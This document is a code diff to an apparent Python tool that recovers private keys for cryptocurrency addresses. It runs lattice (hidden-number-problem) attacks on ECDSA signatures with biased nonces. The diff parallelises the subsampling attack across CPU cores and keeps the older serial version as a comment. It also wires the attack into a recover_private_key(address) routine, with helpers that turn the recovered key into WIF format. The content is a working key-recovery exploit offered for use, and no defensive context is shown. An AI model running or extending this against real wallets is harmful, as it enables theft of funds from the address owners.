@@ -16,6 +16,9 @@ from typing import List, Dict, Optional, Tuple
 from collections import defaultdict
 from test_lattice_recovery import private_key_hex_to_wif, private_key_to_address, fetch_local_blockchain_data
 
+import multiprocessing as mp
+from functools import partial
+
 try:
     from fpylll import IntegerMatrix, BKZ, LLL
     HAVE_FPYLLL = True
@@ -182,16 +185,45 @@ def solve_hnp_subset_general(signatures, bit_pos='top', bit_len=8, prefix=None,
 #  SUBSAMPLING ATTACK – CORRECTED
 # =============================================================================
 
-def subsample_attack_advanced(signatures,
-                              trials_per_size=300,
-                              block_sizes=[20, 24, 28],
-                              timeout=30) -> Optional[int]:
-    """
-    Try multiple bias models on random subsets.
-    Automatically chooses sample sizes based on total count:
-      - If total > 100: use [80, 100, 120]
-      - Else: use [int(total*0.6), int(total*0.75), int(total*0.9)] (clamped ≥10)
-    """
+def worker_lattice_task(signatures, sample_size, bit_pos, bit_len, prefix, block_size, timeout):
+    """Worker for multiprocessing: picks a random subset and runs the lattice reduction."""
+    subset = random.sample(signatures, sample_size)
+    key, frac = solve_hnp_subset_general(subset, bit_pos, bit_len, prefix, block_size, timeout)
+    if key is not None and frac > 0.90:
+        # Verify globally using all signatures
+        q = N
+        if bit_pos == 'top':
+            L = 256 - bit_len
+            total_passes = 0
+            for sig in signatures:
+                s_inv = pow(sig['s'], -1, q)
+                k = ((sig['z'] + sig['r'] * key) * s_inv) % q
+                if prefix is not None:
+                    if (k >> L) == prefix:
+                        total_passes += 1
+                else:
+                    if (k >> L) == 0:
+                        total_passes += 1
+            overall = total_passes / len(signatures)
+        else:  # bottom
+            L = bit_len
+            total_passes = 0
+            for sig in signatures:
+                s_inv = pow(sig['s'], -1, q)
+                k = ((sig['z'] + sig['r'] * key) * s_inv) % q
+                if (k & ((1 << L) - 1)) == 0:
+                    total_passes += 1
+            overall = total_passes / len(signatures)
+        if overall > 0.90:
+            return (key, overall, bit_pos, bit_len, prefix)
+    return None
+
+
+def subsample_attack_advanced_parallel(signatures,
+                                       trials_per_size=300,
+                                       block_sizes=[20, 24, 28],
+                                       timeout=30,
+                                       num_workers=None) -> Optional[int]:
     if not signatures:
         return None
     total = len(signatures)
@@ -199,31 +231,29 @@ def subsample_attack_advanced(signatures,
         print("[!] Too few signatures (<8).")
         return None
 
-    # Generate sensible sample sizes
+    # Generate sample sizes
     if total > 100:
         sample_sizes = [80, 100, 120]
     else:
-        # Use fractions of total, ensuring at least 10 and at most total
         raw = [int(total * f) for f in [0.6, 0.75, 0.9]]
         sample_sizes = sorted(set([max(10, min(total, x)) for x in raw]))
-        # Add a smaller one if possible
         if total >= 20 and 16 not in sample_sizes:
             sample_sizes.append(16)
         sample_sizes = sorted(set(sample_sizes))
 
     print(f"[*] Sample sizes: {sample_sizes} (total signatures: {total})")
 
-    # Build model list (top-zero, bottom-zero, constant prefix 0..7)
+    # Build model list
     models = []
     for bl in [6, 8, 10]:
         models.append(('top', bl, None))
         models.append(('bottom', bl, None))
-    for c in range(8):   # only first 8 prefixes
+    for c in range(8):
         models.append(('top', 8, c))
-
-    # Shuffle to avoid systematic bias
     random.shuffle(models)
 
+    # Generate tasks
+    tasks = []
     for sample_size in sample_sizes:
         if sample_size > total:
             sample_size = total
@@ -231,40 +261,109 @@ def subsample_attack_advanced(signatures,
             continue
         for block_size in block_sizes:
             for bit_pos, bit_len, prefix in models:
-                model_name = f"{bit_pos}_{bit_len}" + (f"_prefix{prefix}" if prefix is not None else "")
-                print(f"[*] Model {model_name}, sample={sample_size}, BKZ-{block_size} for {trials_per_size} trials")
-                for trial in range(trials_per_size):
-                    subset = random.sample(signatures, sample_size)
-                    key, frac = solve_hnp_subset_general(subset, bit_pos, bit_len, prefix, block_size, timeout)
-                    if key is not None and frac > 0.90:
-                        # Global verification
-                        q = N
-                        if bit_pos == 'top':
-                            L = 256 - bit_len
-                            total_passes = 0
-                            for sig in signatures:
-                                s_inv = pow(sig['s'], -1, q)
-                                k = ((sig['z'] + sig['r'] * key) * s_inv) % q
-                                if prefix is not None:
-                                    if (k >> L) == prefix:
-                                        total_passes += 1
-                                else:
-                                    if (k >> L) == 0:
-                                        total_passes += 1
-                            overall = total_passes / len(signatures)
-                        else:
-                            L = bit_len
-                            total_passes = 0
-                            for sig in signatures:
-                                s_inv = pow(sig['s'], -1, q)
-                                k = ((sig['z'] + sig['r'] * key) * s_inv) % q
-                                if (k & ((1 << L) - 1)) == 0:
-                                    total_passes += 1
-                            overall = total_passes / len(signatures)
-                        if overall > 0.90:
-                            print(f"[+] Found key with overall confidence {overall:.2f} (model {model_name})")
-                            return key
+                for _ in range(trials_per_size):
+                    tasks.append((signatures, sample_size, bit_pos, bit_len, prefix, block_size, timeout))
+
+    print(f"[*] Total tasks: {len(tasks)}")
+    if not tasks:
+        return None
+
+    if num_workers is None:
+        num_workers = mp.cpu_count()
+    print(f"[*] Using {num_workers} workers")
+
+    with mp.Pool(processes=num_workers) as pool:
+        # Use starmap with the module‑level worker
+        for res in pool.starmap(worker_lattice_task, tasks, chunksize=10):
+            if res is not None:
+                key, overall, bit_pos, bit_len, prefix = res
+                print(f"[+] Found key with overall confidence {overall:.2f} (model {bit_pos}_{bit_len}_prefix{prefix})")
+                return key
     return None
+
+# def subsample_attack_advanced(signatures,
+#                               trials_per_size=300,
+#                               block_sizes=[20, 24, 28],
+#                               timeout=30) -> Optional[int]:
+#     """
+#     Try multiple bias models on random subsets.
+#     Automatically chooses sample sizes based on total count:
+#       - If total > 100: use [80, 100, 120]
+#       - Else: use [int(total*0.6), int(total*0.75), int(total*0.9)] (clamped ≥10)
+#     """
+#     if not signatures:
+#         return None
+#     total = len(signatures)
+#     if total < 8:
+#         print("[!] Too few signatures (<8).")
+#         return None
+
+#     # Generate sensible sample sizes
+#     if total > 100:
+#         sample_sizes = [80, 100, 120]
+#     else:
+#         # Use fractions of total, ensuring at least 10 and at most total
+#         raw = [int(total * f) for f in [0.6, 0.75, 0.9]]
+#         sample_sizes = sorted(set([max(10, min(total, x)) for x in raw]))
+#         # Add a smaller one if possible
+#         if total >= 20 and 16 not in sample_sizes:
+#             sample_sizes.append(16)
+#         sample_sizes = sorted(set(sample_sizes))
+
+#     print(f"[*] Sample sizes: {sample_sizes} (total signatures: {total})")
+
+#     # Build model list (top-zero, bottom-zero, constant prefix 0..7)
+#     models = []
+#     for bl in [6, 8, 10]:
+#         models.append(('top', bl, None))
+#         models.append(('bottom', bl, None))
+#     for c in range(8):   # only first 8 prefixes
+#         models.append(('top', 8, c))
+
+#     # Shuffle to avoid systematic bias
+#     random.shuffle(models)
+
+#     for sample_size in sample_sizes:
+#         if sample_size > total:
+#             sample_size = total
+#         if sample_size < 8:
+#             continue
+#         for block_size in block_sizes:
+#             for bit_pos, bit_len, prefix in models:
+#                 model_name = f"{bit_pos}_{bit_len}" + (f"_prefix{prefix}" if prefix is not None else "")
+#                 print(f"[*] Model {model_name}, sample={sample_size}, BKZ-{block_size} for {trials_per_size} trials")
+#                 for trial in range(trials_per_size):
+#                     subset = random.sample(signatures, sample_size)
+#                     key, frac = solve_hnp_subset_general(subset, bit_pos, bit_len, prefix, block_size, timeout)
+#                     if key is not None and frac > 0.90:
+#                         # Global verification
+#                         q = N
+#                         if bit_pos == 'top':
+#                             L = 256 - bit_len
+#                             total_passes = 0
+#                             for sig in signatures:
+#                                 s_inv = pow(sig['s'], -1, q)
+#                                 k = ((sig['z'] + sig['r'] * key) * s_inv) % q
+#                                 if prefix is not None:
+#                                     if (k >> L) == prefix:
+#                                         total_passes += 1
+#                                 else:
+#                                     if (k >> L) == 0:
+#                                         total_passes += 1
+#                             overall = total_passes / len(signatures)
+#                         else:
+#                             L = bit_len
+#                             total_passes = 0
+#                             for sig in signatures:
+#                                 s_inv = pow(sig['s'], -1, q)
+#                                 k = ((sig['z'] + sig['r'] * key) * s_inv) % q
+#                                 if (k & ((1 << L) - 1)) == 0:
+#                                     total_passes += 1
+#                             overall = total_passes / len(signatures)
+#                         if overall > 0.90:
+#                             print(f"[+] Found key with overall confidence {overall:.2f} (model {model_name})")
+#                             return key
+#     return None
 
 # =============================================================================
 #  CLUSTERING (time‑based) – unchanged
@@ -301,7 +400,7 @@ def recover_private_key(address: str) -> Optional[int]:
 
     # 2. Subsampling lattice attack
     print("[*] Starting advanced subsampling lattice attack...")
-    key = subsample_attack_advanced(signatures, trials_per_size=300, block_sizes=[20, 24, 28], timeout=30)
+    key = subsample_attack_advanced_parallel(signatures, trials_per_size=300, block_sizes=[20, 24, 28], timeout=30)
     if key:
         return key
 
@@ -312,7 +411,7 @@ def recover_private_key(address: str) -> Optional[int]:
         if len(cluster) < 8:
             continue
         print(f"[*] Cluster {i}: {len(cluster)} signatures")
-        key = subsample_attack_advanced(cluster, trials_per_size=200, block_sizes=[20, 24], timeout=30)
+        key = subsample_attack_advanced_parallel(cluster, trials_per_size=200, block_sizes=[20, 24], timeout=30)
         if key:
             return key
 
